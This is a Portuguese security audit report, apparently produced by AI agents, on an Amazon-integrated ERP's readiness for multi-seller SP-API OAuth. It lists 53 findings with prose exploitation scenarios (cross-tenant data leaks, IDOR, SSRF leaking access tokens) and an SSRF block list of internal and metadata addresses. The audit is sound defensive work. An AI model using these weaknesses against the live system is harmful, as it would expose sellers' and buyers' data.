# Relatório de Security Audit — Atlas Seller (ERP Amazon)

> **Objetivo da engagement:** avaliar a prontidão do sistema para obter **autorização OAuth da Amazon SP-API com acesso _Restricted_ (PII)**, que é o que permite onboardar **sellers terceiros** (modelo SaaS multi-tenant). Lente dupla: classes OWASP + **Amazon Data Protection Policy (DPP)**.
>
> **Data:** 2026-06-01 · **Branch:** `feat/melhorias-ux-6-frentes` · **Método:** white-box / SAST, 11 frentes em paralelo, **69 agentes**, cada achado passou por **verificação adversarial** independente. · **Autorização:** dono do projeto.

## Veredito (TL;DR)

**O sistema NÃO está pronto hoje para o OAuth multi-seller da Amazon** — há **2 bloqueadores CRITICAL**. A boa notícia: a fundação de segurança é **sólida** (vários controles que a Amazon exige já estão bem implementados), e os bloqueadores são **concentrados e endereçáveis**, não espalhados por todo o código.

| Severidade | Qtde | Natureza |
|---|---|---|
| 🔴 CRITICAL | **2** | Isolamento de tenant desligado por padrão + credenciais OAuth Amazon globais. **Bloqueiam a aprovação Amazon.** |
| 🟠 HIGH | **11** | IDOR de PII/fiscal, SSRF (×2), logging de segredos, senha fraca, `$queryRaw` fora do isolamento, defaults inseguros. |
| 🟡 MEDIUM | **15** | CSP fraca, segredos legados em claro, sem purga de PII, sem audit de acesso a PII, `empresaId` nullable, etc. |
| ⚪ LOW | **19** | Hardening: open redirect, fail-open de origin, CRON_SECRET não constant-time, etc. |
| ℹ️ INFO | **6** | 3 são **controles OK** (pontos fortes), 3 observações. |
| | **53 confirmados** | (+5 descartados como falso-positivo na verificação) |

### O que JÁ está bom (pontos fortes para o questionário Amazon)
- **Minimização de PII:** os modelos normalizados de venda/pedido **não persistem PII de comprador** (nome/endereço/telefone). Isso é ouro para a Amazon — *ressalva:* `AmazonOrderRaw.payloadJson` guarda o pedido **cru** (risco latente — ver MEDIUM/LOW).
- **Criptografia de segredos:** AES‑256‑GCM com auth tag e *redaction* em auditoria para tokens OAuth/SMTP/API keys.
- **Isolamento multi-tenant fail-closed bem desenhado** (extensão Prisma + AsyncLocalStorage + cookie assinado) — **quando ligado**. O problema é que vem desligado (ver F01).
- Middleware com RBAC por path, CSP, rate-limit, security headers, CSRF same-origin; sessão HMAC com revogação por `sessionVersion`.

### Os 2 bloqueadores (têm que cair antes de qualquer seller externo)
1. **F01 — Isolamento multi-tenant defaulta para `off` em produção** (`src/lib/db.ts`). A extensão de isolamento só age com `TENANT_ISOLATION=enforce`, e nada no deploy liga a flag. Com 1 seller hoje é inócuo; **no instante em que um 2º seller for cadastrado, todo dado (vendas, financeiro, PII do payload de pedido) vaza entre empresas** só logando, sem exploit.
2. **F02 — Credenciais OAuth da Amazon são globais** (`src/modules/amazon/service.ts`): um único `refresh_token` em `ConfiguracaoSistema` para a plataforma inteira. Não há onde guardar/escopar o token de cada seller — ou seja, **o caso de uso "cada cliente conecta a própria conta Amazon" ainda não existe** arquiteturalmente, e um token global compartilhado é reprovação imediata na DPP.

## Scorecard de prontidão — Amazon SP-API Data Protection Policy

Mapeamento dos 12 controles da DPP (+ isolamento) contra o estado atual do código. Legenda: ✅ ok · ⚠️ parcial · ❌ lacuna · ❓ não-verificável em código (infra/org) · 🟡 em curso.

| # | Controle Amazon DPP | Status | Evidência / lacuna | Onde resolve |
|---|---|---|---|---|
| ★ | **Isolamento entre tenants** | ❌ **Bloqueador** | F01 (flag off) + F02 (creds OAuth globais) | Código / Arquitetura |
| 1 | Criptografia em repouso (PII) | ⚠️ Parcial | Segredos/OAuth cifrados ✅; `AmazonOrderRaw.payloadJson` cru e segredos legados em texto puro ❌; cifragem de disco/DB = infra | Código + Infra |
| 2 | Criptografia em trânsito (TLS 1.2+) | ✅ provável | Nginx + Let's Encrypt; **confirmar** `ssl_protocols TLSv1.2/1.3` e chamadas internas | Infra |
| 3 | KMS / rotação de chaves (anual) | ❌ Lacuna | Chave única em env, default **vazio** (F04), sem KMS nem rotação | Infra / Org |
| 4 | Acesso / least privilege | ❌ Lacuna | Isolamento off (F01), IDOR fiscal (F08), RBAC default-allow fora de prefixos ADMIN | Código |
| 5 | MFA (TOTP/hardware/biometria) | ⚠️ Parcial | Há 2FA **por email** — não é fator aprovado pela Amazon; enable não verifica posse. Precisa TOTP | Código |
| 6 | Proteção de rede (firewall/IDS/IPS) | ❓ Infra | Não verificável em código — documentar firewall do VPS + IDS/IPS + segmentação | Infra / Org |
| 7 | Logging & monitoração (≥12m, central, detecção) | ❌ Lacuna | Sem trilha de acesso a PII, sem retenção definida, sem detecção de anomalia/coleta central | Código + Infra |
| 8 | Resposta a incidente (notificar 24h) | ❓ Org | Sem plano de IR documentado | Org |
| 9 | Gestão de vulnerabilidade (scan 30d, pentest anual) | 🟡 Em curso | **Este audit = pentest inicial.** Falta cadência de scan + pentest anual documentados | Processo |
| 10 | Política de senha (≥12, histórico 10) | ⚠️ Parcial | `definir-senha` aceita 8 chars sem complexidade (F05) | Código |
| 11 | Account lockout (≤10 tentativas) | ⚠️ Verificar | Rate-limit in-memory por IP (10/janela) reseta e é por-processo — não é lockout de conta real | Código + Infra |
| 12 | Retenção / deleção de PII (≤30d, NIST 800-88) | ❌ Lacuna | Sem rotina de purga de PII de pedido | Código |

**Leitura do scorecard:** a Amazon avalia **controles técnicos _e_ organizacionais**. Mesmo com o código 100% corrigido, a aprovação ainda exige itens de **infra/processo** (#3 KMS, #6 rede, #7 retenção de log 12m, #8 plano de IR, #9 cadência de pentest/scan). O código é condição **necessária mas não suficiente** — por isso o roadmap separa as duas trilhas.

## Roadmap de remediação (priorizado)

**Fase 0 — Bloqueadores Amazon (antes de QUALQUER onboard externo):**
- **F01** ligar isolamento: `TENANT_ISOLATION=enforce` documentado no `.env.example` + `deploy/ecosystem.config.js`, **+ boot guard** que aborta o processo se `Empresa.count() > 1` e a flag ≠ `enforce`. ⚠️ O *flip* da flag em prod é **GATED** (backup + staging antes, conforme já decidido no projeto). O **boot guard + docs eu aplico já** — é a mitigação segura que impede onboardar um 2º tenant com o isolamento desligado.
- **F02** credenciais OAuth por-seller: mover para `AmazonAccount` (por `empresaId`), cifradas; worker itera contas com `runWithTenant`. **Arquitetural — pede sessão de design** (não é patch de uma linha).

**Fase 1 — HIGH de código (posso aplicar com sua aprovação):**
- IDOR de documentos financeiros (F07/F08/F09): checagem de dono/empresa + `Content-Disposition: attachment` + content-type seguro.
- SSRF WAHA (F12) e `amazon_endpoint`/`ads_endpoint` (F13): allowlist de host + bloqueio de IP interno/metadata (169.254.169.254/localhost/RFC1918).
- Logging de segredos em DEV (F11): remover/redatar link de reset, código 2FA e token de convite dos logs.
- Senha de convite fraca (F05): exigir a política forte (≥12, complexidade, histórico das últimas 10).
- `CONFIG_ENCRYPTION_KEY` com default vazio (F04): boot guard exigindo a chave (32 bytes hex) em produção.
- `$queryRaw` escapa o filtro de tenant (F10): inventariar usos e escopar/guardar manualmente por `empresaId`.

**Fase 2 — MEDIUM hardening:** CSP sem `unsafe-inline` (nonce/hash), TOTP como 2º fator, rotina de purga de PII ≤30d, audit de acesso a PII, `empresaId` NOT NULL + FK no banco, `upsert` escopado, custos-eventuais escopados, etc.

**Fase 3 — LOW/INFO:** `CRON_SECRET` constant-time, fail-closed de origin ausente, redação de erro cru no `/api/health`, `X-Powered-By` off, `typescript.ignoreBuildErrors` off.

**Fase 4 — Infra / Org (não-código, exigidas pelo questionário Amazon):** KMS + rotação anual de chaves; firewall + IDS/IPS + segmentação de rede; retenção de logs 12m + coleta centralizada + detecção de anomalia; plano de resposta a incidente (notificar Amazon em 24h); cadência de vuln scan a cada 30d + pentest anual; MFA forte para operadores.

## Índice de achados confirmados (53)

Ordenado por severidade. Detalhe completo (descrição, PoC, remediação, verificação adversarial) na seção seguinte, mesmo ID.

| ID | Sev | Dimensão | Local | Achado |
|---|---|---|---|---|
| F01 | **CRITICAL** | multi-tenant | `src/lib/db.ts:151-156, 312-314` | Isolamento multi-tenant defaulta para OFF (no-op) — producao roda sem filtro de empresa |
| F02 | **CRITICAL** | multi-tenant | `src/modules/amazon/service.ts:156-174` | Credenciais OAuth da Amazon (refresh token) sao globais em ConfiguracaoSistema — impossivel isolar por seller |
| F03 | **HIGH** | amazon-dpp-evidence | `src/modules/amazon/service.ts / prisma/schema.prisma:service.ts:106-111,227-241 (getCredentialsOrThrow lê amazon_refresh_token global); schema.prisma:40-57 (AmazonAccount sem campo de token)` | Refresh token / credenciais OAuth Amazon são globais (single-credential), não isolados por seller |
| F04 | **HIGH** | amazon-dpp-evidence | `.env.example / src/lib/db.ts / src/lib/crypto.ts:.env.example CONFIG_ENCRYPTION_KEY=""; db.ts:153-156 (tenantMode default 'off'); crypto.ts:38-44,50-55` | Defaults inseguros de deploy: CONFIG_ENCRYPTION_KEY vazio e TENANT_ISOLATION=off por padrão |
| F05 | **HIGH** | authn-session | `src/app/api/definir-senha/route.ts:13-16, 53` | Senha de convite (admin do tenant) aceita 8 chars sem complexidade — diverge da política forte |
| F06 | **HIGH** | authz-rbac-idor | `src/lib/db.ts:303-365` | Isolamento multi-tenant e no-op por padrao (TENANT_ISOLATION=off) — todo o RBAC object-level depende de uma flag desligada |
| F07 | **HIGH** | authz-rbac-idor | `src/app/api/documentos-financeiros/[id]/arquivo/route.ts:19-27` | findUnique com select restrito (sem empresaId) quebra/anula o isolamento em modo enforce |
| F08 | **HIGH** | authz-rbac-idor | `src/app/api/documentos-financeiros/[id]/arquivo/route.ts:12-46` | Download de documento financeiro (NF/boleto) por id sem checagem de dono — IDOR de PII/dados fiscais |
| F09 | **HIGH** | file-upload | `src/app/api/documentos-financeiros/[id]/arquivo/route.ts:14 (requireSession) e 62-80 (Content-Disposition inline + Content-Type = doc.mimeType)` | Download de documentos financeiros (PII) exige apenas sessao e e servido inline com Content-Type controlado pelo upload |
| F10 | **HIGH** | multi-tenant | `src/lib/db.ts:417-431` | $queryRaw/$executeRaw/$queryRawUnsafe escapam completamente do filtro de tenant |
| F11 | **HIGH** | pii-logging-exposure | `src/lib/email.ts:69-97` | Email em modo DEV loga link de reset de senha, código 2FA e token de convite em texto claro (mais email destinatário) |
| F12 | **HIGH** | ssrf-outbound | `src/modules/whatsapp-estoque/waha-client.ts:50-78 (fetch sem validacao de host); schema em src/modules/whatsapp-estoque/schemas.ts:47-54; gatilho em src/app/api/configuracoes/whatsapp-estoque/enviar-teste/route.ts:8-13` | SSRF via URL configuravel do WAHA (whatsapp_estoque_waha_url) com exfiltracao via botao de teste |
| F13 | **HIGH** | ssrf-outbound | `src/lib/amazon-sp-api.ts:202-223 (spApiRequest: endpoint de config -> new URL -> fetch com x-amz-access-token); analogo em src/lib/amazon-ads-api.ts:243-274; config gravada sem validacao em src/modules/amazon/service.ts:180-201 e src/app/api/amazon/config/route.ts:34-43` | SSRF via amazon_endpoint / amazon_ads_endpoint configuravel vazando access token LWA |
| F14 | **MEDIUM** | amazon-dpp-evidence | `prisma/schema.prisma / src/modules/amazon/jobs.ts:507-589 (VendaAmazon, AmazonOrderRaw); jobs sem purge` | Ausência de rotina de retenção/exclusão de PII de pedido (<=30d pós-entrega exigido pela DPP) |
| F15 | **MEDIUM** | amazon-dpp-evidence | `src/modules/amazon/service.ts / src/modules/amazon/jobs-handlers.ts / src/modules/amazon/parsers/fba-returns-tsv.ts:service.ts:1484 (payloadJson: asJson(order)); jobs-handlers.ts:1366 (payloadJson: JSON.stringify(row.payload)); fba-returns-tsv.ts:76 (payload: row)` | payloadJson armazena resposta/linha BRUTA do pedido sem filtro de campos nem cifragem de coluna |
| F16 | **MEDIUM** | amazon-dpp-evidence | `src/lib/audit.ts / prisma/schema.prisma:audit.ts:18-44 (auditLog grava só mutações com antes/depois); schema.prisma:1102-1124 (AuditLog WRITE-ONLY)` | Trilha de auditoria não registra eventos de leitura/acesso a dados de comprador |
| F17 | **MEDIUM** | authn-session | `src/lib/auth.ts:37-38` | Cookies de sessão sem campo `v` ignoram revogação por sessionVersion (graceful-pass indefinido) |
| F18 | **MEDIUM** | authn-session | `src/lib/session.ts:27-35` | SESSION_SECRET/PLATAFORMA_SESSION_SECRET validados só por comprimento (≥32), sem garantia de entropia |
| F19 | **MEDIUM** | authz-rbac-idor | `src/proxy.ts:210-230` | canAccessPath e default-allow: rotas fora de ADMIN_PATH_PREFIXES sao liberadas a todos os papeis |
| F20 | **MEDIUM** | authz-rbac-idor | `src/app/api/vendas/[vendaId]/custos-eventuais/route.ts:19-66` | Custos eventuais de venda criados/listados/deletados por id de venda sem escopo de empresa |
| F21 | **MEDIUM** | csrf-cors-headers | `src/proxy.ts:96-116` | CSP permite 'unsafe-inline' em script-src em PRODUCAO (sem nonce/hash) — anti-XSS enfraquecido |
| F22 | **MEDIUM** | file-upload | `src/lib/fba-importer.ts:239-243 (processarBuffer: validarBufferXlsx + wb.xlsx.load) e 42-44/157-159 (ws.eachRow carrega todas as linhas em array)` | XLSX importado e descomprimido sem limite (zip bomb / DoS de memoria) |
| F23 | **MEDIUM** | multi-tenant | `src/lib/db.ts:263-283` | Uniques de negocio simples + upsert que nao escopa where permitem casar/sobrescrever linha de outro tenant |
| F24 | **MEDIUM** | multi-tenant | `src/lib/tenant-context.ts:73-94` | Worker, SQS consumer e crons processam toda a Amazon sob empresaId fixo 'mundofs' |
| F25 | **MEDIUM** | multi-tenant | `prisma/schema.postgresql.prisma:490, 509, 538, 552, 557, 596` | empresaId nullable (String?) sem FK/NOT NULL/default no banco — isolamento 100% dependente da app |
| F26 | **MEDIUM** | secrets-crypto | `src/app/api/amazon/ads/config/route.ts:19-23` | GET de config do Amazon Ads vaza comprimento e ultimos 4 caracteres do client_secret/refresh_token OAuth |
| F27 | **MEDIUM** | secrets-crypto | `src/lib/crypto.ts:69-93` | Segredos legados em texto puro permanecem em claro no banco — sem migracao de cifragem em repouso |
| F28 | **MEDIUM** | secrets-crypto | `src/lib/crypto.ts:50-63` | encryptConfigValue grava segredo em texto puro silenciosamente fora de NODE_ENV=production quando a chave falta |
| F29 | **LOW** | authn-session | `src/proxy.ts:277-294` | Middleware autoriza navegação de páginas só com verifySession (sem checar ativo/sessionVersion) |
| F30 | **LOW** | authn-session | `src/app/api/perfil/2fa/route.ts:34-45` | Habilitar 2FA-por-email não verifica posse do email nem confirma com código |
| F31 | **LOW** | config-deps | `src/app/api/health/route.ts:32-50` | Endpoint publico /api/health vaza mensagem crua de erro do banco em 503 |
| F32 | **LOW** | config-deps | `src/proxy.ts:96-116` | CSP de producao permite 'unsafe-inline' em script-src (e 'unsafe-eval' em dev) |
| F33 | **LOW** | config-deps | `src/lib/cron-auth.ts:3-16` | CRON_SECRET comparado com igualdade de string (nao constante no tempo) e fail-open em nao-producao |
| F34 | **LOW** | csrf-cors-headers | `src/lib/origin-check.ts:54-91` | Camada origin-check (CSRF defense-in-depth) roda em report-only por padrao nos endpoints pre-sessao |
| F35 | **LOW** | csrf-cors-headers | `src/proxy.ts:179-196` | Proxy permite mutacao quando header Origin ausente (fail-open) — defesa depende so de sameSite=lax |
| F36 | **LOW** | csrf-cors-headers | `src/lib/cron-auth.ts:7-15` | Cron/worker endpoints publicos ficam totalmente abertos quando CRON_SECRET ausente em ambiente nao-producao |
| F37 | **LOW** | file-upload | `src/modules/documentos-financeiros/service.ts:607-626 (extrairTextoPdfComSenha: PDF.load + extractText em todas as paginas) e 639-667 (buffer inteiro para base64 e enviado como input_file ao OpenAI)` | Parse de PDF arbitrario via @libpdf e reenvio integral ao OpenAI sem cap de paginas |
| F38 | **LOW** | file-upload | `src/lib/file-validation.ts:12-19 (detectMimeFromBytes ramo image/jpeg)` | Validacao de assinatura JPEG so checa SOI/EOI, permitindo polyglots |
| F39 | **LOW** | file-upload | `src/modules/contas-a-pagar/schemas.ts:14 (nfAnexo: z.string().optional()) — consumido em src/app/api/contas/route.ts e persistido via service.ts L306` | Caminho de anexo de NF (nfAnexo) e string arbitraria controlada pelo cliente e persistida |
| F40 | **LOW** | injection | `src/app/api/contas/nf-extract/route.ts:90-94` | Extensao de arquivo de upload nao sanitizada ao montar nome em disco (nf-extract) |
| F41 | **LOW** | pii-logging-exposure | `src/lib/session.ts:9-25, 67-73` | PII (email e nome) trafega no cookie de sessão apenas em base64 (assinado, NÃO cifrado) |
| F42 | **LOW** | pii-logging-exposure | `src/app/api/health/route.ts:32-50` | GET /api/health expõe mensagem crua de erro do banco a chamadores não autenticados |
| F43 | **LOW** | pii-logging-exposure | `prisma/schema.postgresql.prisma:569-589` | AmazonOrderRaw.payloadJson armazena o pedido cru sem cifragem em repouso (risco latente de PII de comprador) |
| F44 | **LOW** | pii-logging-exposure | `src/lib/audit.ts:18-44` | AuditLog persiste email e IP de tentativas de login (inclusive falhas) sem política de retenção |
| F45 | **LOW** | secrets-crypto | `src/lib/cron-auth.ts:13-14` | Comparacao nao constant-time do CRON_SECRET |
| F46 | **LOW** | ssrf-outbound | `src/app/api/produtos/[id]/imagem/route.ts:104-106 (redirect 302 para produto.imagemUrl); analogo em src/app/api/perfil/avatar/route.ts:86-88` | Open redirect autenticado em GET de imagem de produto e avatar (302 para URL externa armazenada) |
| F47 | **LOW** | ssrf-outbound | `src/modules/amazon/report-runner.ts:135-145 (downloadReportDocument: fetch(url) onde url = doc.url da resposta de getReportDocument)` | Download de relatorio Amazon usa URL pre-assinada da resposta sem validacao de host (defesa em profundidade) |
| F48 | **INFO** | amazon-dpp-evidence | `src/lib/amazon-sp-api.ts / src/modules/amazon/parsers/all-orders-tsv.ts / prisma/schema.prisma:amazon-sp-api.ts:41-70 (SPOrder sem BuyerInfo/ShippingAddress); all-orders-tsv.ts:56-72; schema.prisma:507-549 (VendaAmazon)` | CONTROLE OK: minimização forte — nenhuma PII de comprador é persistida nos modelos de pedido/venda |
| F49 | **INFO** | amazon-dpp-evidence | `src/lib/crypto.ts / src/modules/amazon/service.ts / src/lib/audit.ts:crypto.ts:50-93,99-109; service.ts:180-201 (saveAmazonConfig cifra); audit.ts:16,46-64 (redaction)` | CONTROLE OK: cifragem AES-256-GCM de segredos/OAuth em repouso com auth tag e redaction em auditoria |
| F50 | **INFO** | amazon-dpp-evidence | `src/lib/db.ts / src/lib/tenant-context.ts:db.ts:303-406 (applyTenantIsolation); db.ts:47-110 (TENANT_MODELS inclui VendaAmazon/AmazonOrderRaw/AmazonReturn)` | CONTROLE OK: isolamento multi-tenant fail-closed via extensão Prisma + ALS + cookie (quando enforce) |
| F51 | **INFO** | config-deps | `next.config.mjs:1-50` | Header X-Powered-By: Next.js nao desabilitado (fingerprinting de stack) |
| F52 | **INFO** | config-deps | `next.config.mjs:9-11` | Build de producao ignora erros de TypeScript (typescript.ignoreBuildErrors) |
| F53 | **INFO** | file-upload | `src/app/api/documentos-financeiros/[id]/arquivo/route.ts:19-27 (select sem empresaId); padrao identico em src/app/api/produtos/[id]/imagem/route.ts L94-97 e src/app/api/perfil/avatar/route.ts L77-80` | Endpoints que servem arquivos usam findUnique sem empresaId no select (fail-closed em enforce, mas sem isolamento explicito) |

## Achados detalhados

### F01 · [CRITICAL] Isolamento multi-tenant defaulta para OFF (no-op) — producao roda sem filtro de empresa

- **Dimensão:** multi-tenant · **Categoria:** Broken Access Control / Multi-Tenant Isolation · **Confiança:** high
- **Severidade (auditor → verificador):** CRITICAL → CRITICAL · **Veredito:** CONFIRMED
- **Local:** `src/lib/db.ts:151-156, 312-314`

**Descrição.** tenantMode() retorna 'off' a menos que process.env.TENANT_ISOLATION seja exatamente 'enforce'. Em modo 'off' applyTenantIsolation faz `return query(args)` sem tocar em nada (L312-314): nenhum where.empresaId injetado, nenhum fail-closed. O .env.example nao define TENANT_ISOLATION e nada no deploy o liga, logo o estado de PRODUCAO e 'off'. Resultado: qualquer query a qualquer modelo TENANT retorna linhas de TODAS as empresas. Hoje funciona porque ha um unico tenant ('mundofs'), mas no instante em que um 2o seller for cadastrado, toda venda, pedido, PII de comprador, financeiro e configuracao vazam entre tenants sem nenhuma barreira.

**Cenário de exploração.** 1) Dono onboarda o seller B (cria Empresa B + usuario B) com a flag ainda em off. 2) Usuario do seller B faz login (cookie valido, empresaId=B). 3) Abre /vendas, /dashboard-ecommerce, /api/produtos — como o filtro esta desligado, o Prisma traz indistintamente registros de A e B. 4) Seller B le pedidos, nomes/enderecos de compradores e faturamento do seller A. Vazamento cross-tenant total sem precisar de exploit, so logando.

**Remediação.** Antes de qualquer onboard externo: (a) ligar TENANT_ISOLATION=enforce em prod e documentar no .env.example como obrigatorio; (b) adicionar guard de boot que ABORTA o processo se houver >1 Empresa ativa e a flag != enforce; (c) cobrir os caminhos raw/background/upsert (ver outros findings) antes de virar a chave. Tratar 'enforce' como o unico modo suportado em multi-tenant, nao um opt-in.

**Relevância Amazon DPP.** Bloqueador absoluto. A Amazon DPP exige isolamento estrito de dados entre sellers; vazamento cross-tenant de PII de comprador (nome/endereco/telefone vindos de Orders) e a falha mais grave possivel no questionario de seguranca. Com a flag off e >1 seller, a aprovacao e impossivel.

**Verificação adversarial.** The auditor's claim is fully supported by the source code. Verified facts:

1. `src/lib/db.ts` L153-155: `tenantMode()` reads `process.env.TENANT_ISOLATION?.toLowerCase()` and returns `"enforce"` only when exactly `"enforce"` — otherwise defaults to `"off"`. This is unambiguous.

2. `src/lib/db.ts` L312-314: In `"off"` mode, `applyTenantIsolation` immediately executes `return query(args)` with zero modification — confirmed no-op, no `empresaId` injection, no fail-closed.

3. `.env.example` (entire file read): `TENANT_ISOLATION` is completely absent. Operators who follow the standard `cp .env.example .env` path receive no guidance to set the flag.

4. `deploy/ecosystem.config.js`: Neither `erp-web`, `erp-worker`, nor `erp-sqs-consumer` set `TENANT_ISOLATION` in their `env` blocks.

5. `deploy/README.md`: The installation and update sequences make no mention of setting `TENANT_ISOLATION=enforce`.

6. No boot guard exists anywhere in the codebase that checks whether `>1 Empresa` is active and `TENANT_ISOLATION != enforce` — the remediation's suggestion (b) is unimplemented.

Counter-evi…

---

### F02 · [CRITICAL] Credenciais OAuth da Amazon (refresh token) sao globais em ConfiguracaoSistema — impossivel isolar por seller

- **Dimensão:** multi-tenant · **Categoria:** Broken Access Control / Insecure Credential Storage · **Confiança:** high
- **Severidade (auditor → verificador):** CRITICAL → CRITICAL · **Veredito:** CONFIRMED
- **Local:** `src/modules/amazon/service.ts:156-174`

**Descrição.** getAmazonConfig() le amazon_client_id/secret/refresh_token/marketplace_id de ConfiguracaoSistema por chave global (db.configuracaoSistema.findMany por `chave`), e ConfiguracaoSistema esta em GLOBAL_MODELS (db.ts L131) — uma unica linha por chave para a plataforma inteira, sem empresaId. O modelo AmazonAccount (schema L40-57) tem empresaId e status PENDENTE/ATIVA, sugerindo intencao de credenciais por-seller, mas o codigo de runtime (worker.ts L241-259, listings-diff.ts L62-70) ainda consome a config GLOBAL. Logo existe UM unico refresh token Amazon para todos os tenants. O proprio objetivo de negocio (clientes conectam suas proprias contas Amazon) e inviavel: nao ha onde guardar/escopar o token OAuth de cada seller, e o worker so sabe usar o token global.

**Cenário de exploração.** 1) Seller A conecta sua conta Amazon (token salvo em amazon_refresh_token global). 2) Seller B conecta a dele — sobrescreve o token de A (mesma chave global). 3) O worker, rodando sob 'mundofs', usa o ultimo token salvo e puxa pedidos+PII da conta de quem salvou por ultimo, gravando sob empresaId fixo. Pedidos de A e B se misturam sob um tenant, e o token de um seller pode ser usado para chamar a SP-API em nome de outro.

**Remediação.** Mover credenciais Amazon para o modelo AmazonAccount (por empresaId), cifradas em repouso (reusar crypto.ts AES-256-GCM), e refatorar o worker para iterar AmazonAccount ATIVA com runWithTenant({empresaId}) por conta. getAmazonConfig deve receber empresaId/accountId, nunca ler chave global em multi-tenant.

**Relevância Amazon DPP.** Bloqueador duplo: (1) a DPP exige armazenamento CIFRADO e ISOLADO de credenciais/refresh tokens OAuth por seller; um token global compartilhado e reprovado de imediato. (2) Sem credenciais por-conta o caso de uso 'multi-seller OAuth' nem existe. Este e o coracao do que a Amazon vai avaliar no onboarding de terceiros.

**Verificação adversarial.** The finding is accurate and well-evidenced. Reading the actual files confirms every claim:

1. `ConfiguracaoSistema` (schema.prisma L849-855, schema.postgresql.prisma L830-836) has `chave @unique` with no `empresaId` column — a single flat key-value store shared across the entire database.

2. `getAmazonConfig()` (service.ts L156-174) performs `db.configuracaoSistema.findMany({ where: { chave: { in: [...AMAZON_CONFIG_KEYS] } } })` with zero tenant scoping. The keys `amazon_refresh_token`, `amazon_client_secret`, `amazon_client_id`, `amazon_marketplace_id` are global singletons.

3. `AmazonAccount` (schema.prisma L40-57) exists and has `empresaId`, but it stores only metadata fields (`nome`, `marketplaceId`, `sellerId`, `endpoint`, `status`). There are **no credential fields** — no `refreshToken`, `clientId`, `clientSecret`. The model is a skeleton for a planned per-tenant credential store that has not been implemented.

4. `worker.ts` (L79-88) hard-codes a single tenant via `WORKER_EMPRESA_ID = process.env.WORKER_EMPRESA_ID || "mundofs"` and runs all jobs under `runWithTenant({ empre…

---

### F03 · [HIGH] Refresh token / credenciais OAuth Amazon são globais (single-credential), não isolados por seller

- **Dimensão:** amazon-dpp-evidence · **Categoria:** Multi-tenant Isolation / OAuth (Amazon DPP) · **Confiança:** high
- **Severidade (auditor → verificador):** MEDIUM → HIGH · **Veredito:** CONFIRMED
- **Local:** `src/modules/amazon/service.ts / prisma/schema.prisma:service.ts:106-111,227-241 (getCredentialsOrThrow lê amazon_refresh_token global); schema.prisma:40-57 (AmazonAccount sem campo de token)`

**Descrição.** O objetivo de negócio é onboard de sellers terceiros via OAuth, mas a arquitetura de credenciais ainda é SINGLE-TENANT: o refresh_token/client_secret vivem em ConfiguracaoSistema sob chaves globais (amazon_refresh_token, amazon_client_secret — service.ts:106-111), e getCredentialsOrThrow (service.ts:241) sempre resolve esse conjunto único. O modelo AmazonAccount (schema.prisma:40-57), que seria o portador natural do token por-seller, NÃO tem nenhum campo de refresh token/credencial — só nome/marketplaceId/sellerId/status. Não há tabela per-seller cifrada de tokens OAuth.

**Cenário de exploração.** Sem token por-seller, ao conectar a 2ª conta Amazon o sistema sobrescreveria a credencial global, ou todos os tenants compartilhariam a mesma conexão SP-API — vazamento cross-seller de dados de pedido. A DPP exige que credenciais de cada seller sejam isoladas e cifradas individualmente; a arquitetura atual não suporta isso. É o gap arquitetural que impede o multi-seller real.

**Remediação.** Adicionar campos cifrados de refresh token (e client/secret se por-app) em AmazonAccount (ou tabela AmazonOAuthCredential 1:1 com AmazonAccount), cifrados com AES-256-GCM (crypto.ts). Resolver credenciais por empresaId/AmazonAccount no worker e nas rotas (substituir getCredentialsOrThrow global por lookup por tenant). Garantir que o worker itere contas com contexto runWithTenant correto.

**Relevância Amazon DPP.** Pré-requisito arquitetural para autorização multi-seller. A DPP cobra armazenamento cifrado E isolado de credenciais OAuth por seller; o modelo global atual reprova o questionário e cria risco real de vazamento cross-tenant quando o 2º seller conectar.

**Verificação adversarial.** The finding is fully confirmed by direct code and schema evidence:

1. **ConfiguracaoSistema is a keyless global table**: `prisma/schema.postgresql.prisma:830-836` — `ConfiguracaoSistema` has no `empresaId` column. It is a flat key-value store with `chave @unique`. All Amazon OAuth credentials (`amazon_client_id`, `amazon_client_secret`, `amazon_refresh_token`) live here as global singletons.

2. **getAmazonConfig() reads the global table without tenant scoping**: `src/modules/amazon/service.ts:156-174` — `db.configuracaoSistema.findMany({ where: { chave: { in: [...AMAZON_CONFIG_KEYS] } } })` — no `empresaId` filter. There is no tenant-aware credential lookup.

3. **getCredentialsOrThrow() calls the global getAmazonConfig()**: `service.ts:241-250`. Every SP-API call in the service layer — syncInventory, syncOrdersInternal, syncFinancialEvents, checkReviewSolicitation, sendReviewSolicitation, runReviewDiscovery, runReviewSendBatch — resolves credentials from the same global row.

4. **AmazonAccount has no credential fields**: Both `prisma/schema.prisma:40-57` and `prisma/schema.postgr…

---

### F04 · [HIGH] Defaults inseguros de deploy: CONFIG_ENCRYPTION_KEY vazio e TENANT_ISOLATION=off por padrão

- **Dimensão:** amazon-dpp-evidence · **Categoria:** Security Misconfiguration / Encryption & Isolation (Amazon DPP) · **Confiança:** high
- **Severidade (auditor → verificador):** HIGH → HIGH · **Veredito:** CONFIRMED
- **Local:** `.env.example / src/lib/db.ts / src/lib/crypto.ts:.env.example CONFIG_ENCRYPTION_KEY=""; db.ts:153-156 (tenantMode default 'off'); crypto.ts:38-44,50-55`

**Descrição.** Dois defaults de deploy comprometem controles DPP se a produção não for explicitamente configurada: (1) .env.example traz CONFIG_ENCRYPTION_KEY="" vazio. Em crypto.ts (L50-55), encryptConfigValue SEM chave em produção lança erro ao salvar segredo (bom), MAS valores legados/já gravados em texto puro são lidos como estão (decryptConfigValue L69-71 retorna texto cru se não tem prefixo enc:) — i.e., a cifragem só protege se a chave foi setada ANTES de salvar credenciais. (2) TENANT_ISOLATION default é 'off' (db.ts:155-156, e playwright.config.ts:29) — modo no-op TOTAL onde NENHUMA query é filtrada por empresaId. O isolamento cross-tenant só existe quando TENANT_ISOLATION=enforce for explicitamente ligado em prod.

**Cenário de exploração.** Se a VPS subir sem CONFIG_ENCRYPTION_KEY, o refresh_token Amazon e demais segredos ficam em texto puro em ConfiguracaoSistema (legível em backup/dump). Se TENANT_ISOLATION ficar 'off' (default) com mais de uma empresa cadastrada, qualquer query a VendaAmazon/AmazonOrderRaw retorna dados de TODOS os tenants — vazamento cross-seller de dados de pedido (bloqueador absoluto DPP). Ambos dependem de o operador lembrar de ligar a flag/chave; o default falha aberto.

